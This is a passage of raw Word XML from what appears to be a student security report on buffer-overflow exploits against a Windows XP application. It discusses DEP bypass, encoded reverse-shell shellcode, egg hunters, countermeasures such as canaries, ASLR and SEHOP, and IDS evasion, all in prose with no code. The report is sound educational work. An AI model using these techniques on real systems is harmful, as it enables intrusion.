        <w:t xml:space="preserve"> security and the use of a greatly outdated operating system. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72C00253" w14:textId="160B0EF0" w:rsidR="0021744F" w:rsidRDefault="00B657F1" w:rsidP="008332D2">
      <w:r>
        <w:t>Using</w:t>
      </w:r>
      <w:r w:rsidR="0021744F">
        <w:t xml:space="preserve"> Windows XP for the exploits discussed above allowed for seemingly unlimited access to the application using buffer overflow attacks.</w:t>
      </w:r>
      <w:r w:rsidR="007C5D85">
        <w:t xml:space="preserve"> This is partly due to</w:t>
      </w:r>
      <w:r w:rsidR="0021744F">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C26F2A">
        <w:t xml:space="preserve">the way </w:t>
      </w:r>
      <w:r w:rsidR="0021744F">
        <w:t>Windows XP “.</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="0021744F">
        <w:t>dll</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="0021744F">
        <w:t>” files are stored</w:t>
      </w:r>
      <w:r w:rsidR="00C26F2A">
        <w:t xml:space="preserve">-  </w:t>
      </w:r>
      <w:r w:rsidR="0021744F">
        <w:t>in the same memory addresses each time the machine is booted up</w:t>
      </w:r>
      <w:r>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="0021744F">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>making</w:t>
      </w:r>
      <w:r w:rsidR="0021744F">
        <w:t xml:space="preserve"> any vulnerabilities</w:t>
      </w:r>
      <w:r w:rsidR="00C26F2A">
        <w:t xml:space="preserve"> or actions</w:t>
      </w:r>
      <w:r w:rsidR="0021744F">
        <w:t xml:space="preserve"> that utilize these files </w:t>
      </w:r>
      <w:r w:rsidR="007C5D85">
        <w:t xml:space="preserve">for jumps and returns </w:t>
      </w:r>
      <w:r w:rsidR="0021744F">
        <w:t>comparatively easier to exploit than more recent operating systems</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> which randomize their locations.</w:t>
      </w:r>
      <w:r w:rsidR="007C5D85">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00437906">
        <w:t>This is particularly true for bypassing DEP, which required the use of a small number of applications and dependencies to completely avoid and get the shellcode working as if it was never enabled</w:t>
      </w:r>
      <w:r w:rsidR="00DC56CC">
        <w:t xml:space="preserve"> in the first place</w:t>
      </w:r>
      <w:r w:rsidR="00437906">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C67C4A3" w14:textId="3501BB34" w:rsidR="007C5D85" w:rsidRDefault="007C5D85" w:rsidP="008332D2">
      <w:r>
        <w:t>The space for shellcode after the initial stack was</w:t>
      </w:r>
      <w:r w:rsidR="00F34A79">
        <w:t xml:space="preserve"> incredibly</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00F34A79">
        <w:t>large</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, allowing </w:t>
      </w:r>
      <w:r w:rsidR="00F34A79">
        <w:t>for the use of</w:t>
      </w:r>
      <w:r w:rsidR="00DC56CC">
        <w:t xml:space="preserve"> message box and reverse shell</w:t>
      </w:r>
      <w:r w:rsidR="00F34A79">
        <w:t xml:space="preserve"> shellcodes as long as they were encoded in ‘alpha_upper’, which </w:t>
      </w:r>
      <w:r w:rsidR="00DC56CC">
        <w:t>could</w:t>
      </w:r>
      <w:r w:rsidR="00F34A79">
        <w:t xml:space="preserve"> easily be done with hacking framework tools like </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00F34A79">
        <w:t>msfvenom</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00F34A79">
        <w:t xml:space="preserve">. Even in the event this space was not big enough, egg-hunting shellcode was demonstrated to work flawlessly, and would have been able to bypass the shellcode size limit with relative ease whether it was placed within the hundreds </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00AE09B1">
        <w:t>As</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00F34A79">
        <w:t xml:space="preserve"> in ‘omelet’ form or in a space defined well above the stack as long as the associated tag was present.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DC90D6D" w14:textId="0572AFDB" w:rsidR="00C26F2A" w:rsidRDefault="00F34A79" w:rsidP="008332D2">
      <w:r>
        <w:t xml:space="preserve">The program made minimal use of character filtering, removing the characters from \x00 to \x1f. Despite this filtering, it was bypassed with the use of alpha_upper encoding demonstrated in </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>msfgui</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">. Once the characters were encoded, no further errors appeared suggesting </w:t>
      </w:r>
      <w:r w:rsidR="00C26F2A">
        <w:t>that any alpha_upper encoded shellcode could easily be uploaded through the skin select menu regardless of its severity or contents.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63834C7A" w14:textId="158305B7" w:rsidR="003724A4" w:rsidRPr="003724A4" w:rsidRDefault="009525A9" w:rsidP="003724A4">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="39" w:name="_Toc102919486"/>
      <w:bookmarkStart w:id="40" w:name="_Toc103326472"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Countermeasures</w:t>
      </w:r>
      <w:bookmarkEnd w:id="39"/>
      <w:bookmarkEnd w:id="40"/>
    </w:p>
    <w:p w14:paraId="4320535C" w14:textId="0F05014E" w:rsidR="003724A4" w:rsidRDefault="003724A4" w:rsidP="003724A4">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">While many modern programmers learn about buffer overflows as one of the fundamental building blocks of modern software security among other important security techniques, the modern operating systems of today implement a variety of safety catches to further prevent attackers from exploiting </w:t>
      </w:r>
      <w:r w:rsidR="004114D9">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">the programs present on the system. This is done because many of the attacks that are possible due to a lack of proper security measures on software can also greatly impact the operating system itself, its users, and potentially even users all over the internet as demonstrated by the Melissa Virus in the late 90’s </w:t>
      </w:r>
      <w:sdt>
        <w:sdtPr>
          <w:rPr>
            <w:lang w:eastAsia="en-US"/>
          </w:rPr>
          <w:id w:val="-1445222915"/>
          <w:citation/>
        </w:sdtPr>
        <w:sdtEndPr/>
        <w:sdtContent>
          <w:r w:rsidR="004114D9">
            <w:rPr>
              <w:lang w:eastAsia="en-US"/>
            </w:rPr>
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r w:rsidR="004114D9">
            <w:rPr>
              <w:lang w:val="en-GB" w:eastAsia="en-US"/>
            </w:rPr>
            <w:instrText xml:space="preserve"> CITATION Jua18 \l 2057 </w:instrText>
          </w:r>
          <w:r w:rsidR="004114D9">
            <w:rPr>
              <w:lang w:eastAsia="en-US"/>
            </w:rPr>
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:r w:rsidR="00DC56CC" w:rsidRPr="00DC56CC">
            <w:rPr>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-US"/>
            </w:rPr>
            <w:t>(Harán, 2018)</w:t>
          </w:r>
          <w:r w:rsidR="004114D9">
            <w:rPr>
              <w:lang w:eastAsia="en-US"/>
            </w:rPr>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:sdtContent>
      </w:sdt>
      <w:r w:rsidR="004114D9">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. At the time, this was the fastest spreading computer virus of all time, utilizing macros (short pieces of code within an email) to send itself to 50 of the first contacts on the users address book, spreading itself and infecting the user’s computer. Other side effects of the Melissa virus included sending files from the </w:t>
      </w:r>
      <w:r w:rsidR="00AE09B1">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>victim’s</w:t>
      </w:r>
      <w:r w:rsidR="004114D9">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> computer to other people and modifying documents.</w:t>
      </w:r>
      <w:r w:rsidR="00DB0770">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Though </w:t>
      </w:r>
      <w:r w:rsidR="004114D9">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>this is not a buffer overflow attack specifically, it demonstrates the need for a defense in depth approach to programming.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27237736" w14:textId="1FFC10D3" w:rsidR="00437906" w:rsidRDefault="00971883" w:rsidP="003724A4">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720" w:hanging="720"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="41" w:name="_Toc103326473"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Stack Canaries</w:t>
      </w:r>
      <w:bookmarkEnd w:id="41"/>
    </w:p>
    <w:p w14:paraId="36B63D8A" w14:textId="1E15132D" w:rsidR="00437906" w:rsidRDefault="00971883" w:rsidP="00437906">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">This countermeasure places a random character in memory right before EIP, the pointer </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00E229ED">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>register</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>. Since buffer overflows generally overwrite memory addresses starting at lower values and working their way up, this ‘canary’ value would have to be overwritten in order to take full control of EIP, which is required to execute shellcode. However, the program is immediately terminated if the value is detected to be incorrect as a result of a buffer overflow attempt</w:t>
      </w:r>
      <w:sdt>
        <w:sdtPr>
          <w:rPr>
            <w:lang w:eastAsia="en-US"/>
          </w:rPr>
          <w:id w:val="-2110034180"/>
          <w:citation/>
        </w:sdtPr>
        <w:sdtEndPr/>
        <w:sdtContent>
          <w:r w:rsidR="00E229ED">
            <w:rPr>
              <w:lang w:eastAsia="en-US"/>
            </w:rPr>
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r w:rsidR="00E229ED">
            <w:rPr>
              <w:lang w:val="en-GB" w:eastAsia="en-US"/>
            </w:rPr>
            <w:instrText xml:space="preserve"> CITATION Dow07 \l 2057 </w:instrText>
          </w:r>
          <w:r w:rsidR="00E229ED">
            <w:rPr>
              <w:lang w:eastAsia="en-US"/>
            </w:rPr>
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:r w:rsidR="00DC56CC">
            <w:rPr>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-US"/>
            </w:rPr>
            <w:t xml:space="preserve"> </w:t>
          </w:r>
          <w:r w:rsidR="00DC56CC" w:rsidRPr="00DC56CC">
            <w:rPr>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-US"/>
            </w:rPr>
            <w:t>(Dowd, McDonald, &amp; Schuh, 2007)</w:t>
          </w:r>
          <w:r w:rsidR="00E229ED">
            <w:rPr>
              <w:lang w:eastAsia="en-US"/>
            </w:rPr>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:sdtContent>
      </w:sdt>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="00E229ED">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">s with most countermeasures, this is still susceptible to being bypassed. Skilled attackers may make use of a memory leak vulnerability to ‘leak’ the canary value </w:t>
      </w:r>
      <w:r w:rsidR="00552735">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">out such that it can be read and bypassed by a skilled attacker </w:t>
      </w:r>
      <w:sdt>
        <w:sdtPr>
          <w:rPr>
            <w:lang w:eastAsia="en-US"/>
          </w:rPr>
          <w:id w:val="-1588229817"/>
          <w:citation/>
        </w:sdtPr>
        <w:sdtEndPr/>
        <w:sdtContent>
          <w:r w:rsidR="00552735">
            <w:rPr>
              <w:lang w:eastAsia="en-US"/>
            </w:rPr>
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r w:rsidR="00552735">
            <w:rPr>
              <w:lang w:val="en-GB" w:eastAsia="en-US"/>
            </w:rPr>
            <w:instrText xml:space="preserve"> CITATION Mic21 \l 2057 </w:instrText>
          </w:r>
          <w:r w:rsidR="00552735">
            <w:rPr>
              <w:lang w:eastAsia="en-US"/>
            </w:rPr>
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:r w:rsidR="00DC56CC" w:rsidRPr="00DC56CC">
            <w:rPr>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-US"/>
            </w:rPr>
            <w:t>(Lemmens, 2021)</w:t>
          </w:r>
          <w:r w:rsidR="00552735">
            <w:rPr>
              <w:lang w:eastAsia="en-US"/>
            </w:rPr>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:sdtContent>
      </w:sdt>
      <w:r w:rsidR="00552735">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>, particularly through the use of a ‘Format String’ attack, which allow attackers to read the stack by having the program interpret an input as a command</w:t>
      </w:r>
      <w:r w:rsidR="00E229ED">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:sdt>
        <w:sdtPr>
          <w:rPr>
            <w:lang w:eastAsia="en-US"/>
          </w:rPr>
          <w:id w:val="-1563709329"/>
          <w:citation/>
        </w:sdtPr>
        <w:sdtEndPr/>
        <w:sdtContent>
          <w:r w:rsidR="00E229ED">
            <w:rPr>
              <w:lang w:eastAsia="en-US"/>
            </w:rPr>
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r w:rsidR="00E229ED">
            <w:rPr>
              <w:lang w:val="en-GB" w:eastAsia="en-US"/>
            </w:rPr>
            <w:instrText xml:space="preserve"> CITATION mei22 \l 2057 </w:instrText>
          </w:r>
          <w:r w:rsidR="00E229ED">
            <w:rPr>
              <w:lang w:eastAsia="en-US"/>
            </w:rPr>
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:r w:rsidR="00DC56CC" w:rsidRPr="00DC56CC">
            <w:rPr>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-US"/>
            </w:rPr>
            <w:t>(meir555, 2022)</w:t>
          </w:r>
          <w:r w:rsidR="00E229ED">
            <w:rPr>
              <w:lang w:eastAsia="en-US"/>
            </w:rPr>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:sdtContent>
      </w:sdt>
      <w:r w:rsidR="00552735">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="571C099E" w14:textId="2F54BADC" w:rsidR="00437906" w:rsidRDefault="00437906" w:rsidP="003724A4">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720" w:hanging="720"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="42" w:name="_Toc103326474"/>
      <w:r w:rsidRPr="00437906">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Address Space Randomization</w:t>
      </w:r>
      <w:r w:rsidR="003724A4">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (ASLR)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="42"/>
    </w:p>
    <w:p w14:paraId="0294999D" w14:textId="578DD58A" w:rsidR="003724A4" w:rsidRDefault="00E229ED" w:rsidP="003724A4">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>ASLR aims to prevent the use of .</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>dll</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> files for exploits like the use of malicious shellcode and ROP chains, which rely on various instructions written in these files to navigate memory and run the exploit</w:t>
      </w:r>
      <w:r w:rsidR="00164027">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> on the program</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="00164027">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>The reason .</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00164027">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>dll</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00164027">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> files are targeted specifically for these instructions is because in Windows XP, they are loaded into the same memory location each time the computer turned on. This makes them highly consistent, predictable, and reliable for the attacks that need to use them. Again, no countermeasure is perfect, and ASLR can be bypassed with the use of an accurate ‘sprayer’ which places data in the same place each time it is run</w:t>
      </w:r>
      <w:r w:rsidR="00F9099B">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, paired with an ROP chain through GrooveUtil.dll as demonstrated by Vinay </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00F9099B">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Katoch</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00F9099B">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:sdt>
        <w:sdtPr>
          <w:rPr>
            <w:lang w:eastAsia="en-US"/>
          </w:rPr>
          <w:id w:val="-1423171131"/>
          <w:citation/>
        </w:sdtPr>
        <w:sdtEndPr/>
        <w:sdtContent>
          <w:r w:rsidR="00F9099B">
            <w:rPr>
              <w:lang w:eastAsia="en-US"/>
            </w:rPr>
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r w:rsidR="00F9099B">
            <w:rPr>
              <w:lang w:val="en-GB" w:eastAsia="en-US"/>
            </w:rPr>
            <w:instrText xml:space="preserve">CITATION Katte \n  \l 2057 </w:instrText>
          </w:r>
          <w:r w:rsidR="00F9099B">
            <w:rPr>
              <w:lang w:eastAsia="en-US"/>
            </w:rPr>
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:r w:rsidR="00DC56CC" w:rsidRPr="00DC56CC">
            <w:rPr>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-US"/>
            </w:rPr>
            <w:t>(Whitepaper on Bypassing ASLR/DEP, no date)</w:t>
          </w:r>
          <w:r w:rsidR="00F9099B">
            <w:rPr>
              <w:lang w:eastAsia="en-US"/>
            </w:rPr>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:sdtContent>
      </w:sdt>
      <w:r w:rsidR="00F9099B">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38B21B58" w14:textId="57EDACD2" w:rsidR="003724A4" w:rsidRDefault="003724A4" w:rsidP="003724A4">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720" w:hanging="720"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="43" w:name="_Toc103326475"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Structured Exception Handler Overwrite Protection (SEHOP)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="43"/>
    </w:p>
    <w:p w14:paraId="7DC008EA" w14:textId="4E1CB4F5" w:rsidR="003724A4" w:rsidRDefault="00F9099B" w:rsidP="003724A4">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">SEHOP aims to counter exploits that target the SEH (Structured Exception Handler) to overwrite </w:t>
      </w:r>
      <w:r w:rsidR="002B2738">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>it and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> is one of the most popular methods of exploiting Windows programs. SEH works by creating a consistent, uniform way of handling program exceptions which may appear throughout the programs use, like attempting to close an invalid handle </w:t>
      </w:r>
      <w:sdt>
        <w:sdtPr>
          <w:rPr>
            <w:lang w:eastAsia="en-US"/>
          </w:rPr>
          <w:id w:val="1098371047"/>
          <w:citation/>
        </w:sdtPr>
        <w:sdtEndPr/>
        <w:sdtContent>
          <w:r>
            <w:rPr>
              <w:lang w:eastAsia="en-US"/>
            </w:rPr>
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r>
            <w:rPr>
              <w:lang w:val="en-GB" w:eastAsia="en-US"/>
            </w:rPr>
            <w:instrText xml:space="preserve"> CITATION mmi06 \l 2057 </w:instrText>
          </w:r>
          <w:r>
            <w:rPr>
              <w:lang w:eastAsia="en-US"/>
            </w:rPr>
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:r w:rsidR="00DC56CC" w:rsidRPr="00DC56CC">
            <w:rPr>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-US"/>
            </w:rPr>
            <w:t>(mmiller, 2006)</w:t>
          </w:r>
          <w:r>
            <w:rPr>
              <w:lang w:eastAsia="en-US"/>
            </w:rPr>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:sdtContent>
      </w:sdt>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="002B2738">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">As the name suggests, this countermeasure aims to prevent the handler from being </w:t>
      </w:r>
      <w:r w:rsidR="00AE09B1">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>overwritten but</w:t>
      </w:r>
      <w:r w:rsidR="002B2738">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> is vulnerable to a whole host of bypasses and exploits itself </w:t>
      </w:r>
      <w:sdt>
        <w:sdtPr>
          <w:rPr>
            <w:lang w:eastAsia="en-US"/>
          </w:rPr>
          <w:id w:val="1298566850"/>
          <w:citation/>
        </w:sdtPr>
        <w:sdtEndPr/>
        <w:sdtContent>
          <w:r w:rsidR="002B2738">
            <w:rPr>
              <w:lang w:eastAsia="en-US"/>
            </w:rPr>
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r w:rsidR="002B2738">
            <w:rPr>
              <w:lang w:val="en-GB" w:eastAsia="en-US"/>
            </w:rPr>
            <w:instrText xml:space="preserve"> CITATION LeBte \l 2057 </w:instrText>
          </w:r>
          <w:r w:rsidR="002B2738">
            <w:rPr>
              <w:lang w:eastAsia="en-US"/>
            </w:rPr>
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:r w:rsidR="00DC56CC" w:rsidRPr="00DC56CC">
            <w:rPr>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-US"/>
            </w:rPr>
            <w:t>(Le Berre &amp; Cauquil, no date)</w:t>
          </w:r>
          <w:r w:rsidR="002B2738">
            <w:rPr>
              <w:lang w:eastAsia="en-US"/>
            </w:rPr>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:sdtContent>
      </w:sdt>
      <w:r w:rsidR="002B2738">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1591B775" w14:textId="77777777" w:rsidR="003724A4" w:rsidRPr="003724A4" w:rsidRDefault="003724A4" w:rsidP="003724A4">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0DEEF525" w14:textId="3C6AE134" w:rsidR="00437906" w:rsidRDefault="00437906" w:rsidP="00437906">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="44" w:name="_Toc103326476"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Evading Intrusion Detection Systems</w:t>
      </w:r>
      <w:bookmarkEnd w:id="44"/>
    </w:p>
    <w:p w14:paraId="6B4E69AB" w14:textId="1F9F8188" w:rsidR="00437906" w:rsidRDefault="002B2738" w:rsidP="00437906">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Intrusion Detection Systems</w:t>
      </w:r>
      <w:r w:rsidR="00DB0770">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (IDS)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> can be bypassed through the use of 3 generic techniques, summarized as</w:t>
      </w:r>
      <w:r w:rsidR="00DB0770">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> follows:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Obfuscation (hiding payloads or activity), Evasion (</w:t>
      </w:r>
      <w:r w:rsidR="00DB0770">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>hiding details and fragmenting)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>, and Denial of Service</w:t>
      </w:r>
      <w:r w:rsidR="00DB0770">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (bringing the service down)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00DB0770">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Despite the fact many IDS’ have been updated to catch basic circumvention attempts, hackers continue to create new and innovative ways to hide from these security systems.</w:t>
      </w:r>
      <w:r w:rsidR="00FA045B">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> It should be noted that Intrusion Detection Systems generally come in two main varieties, Signature-based (SIDS), which matches data patterns on the network with known attacks, and Anomaly-based (AIDS), which makes use of machine learning to determine which activity is ordinary and which is an anomaly</w:t>
      </w:r>
      <w:r w:rsidR="00DC56CC">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> in real time</w:t>
      </w:r>
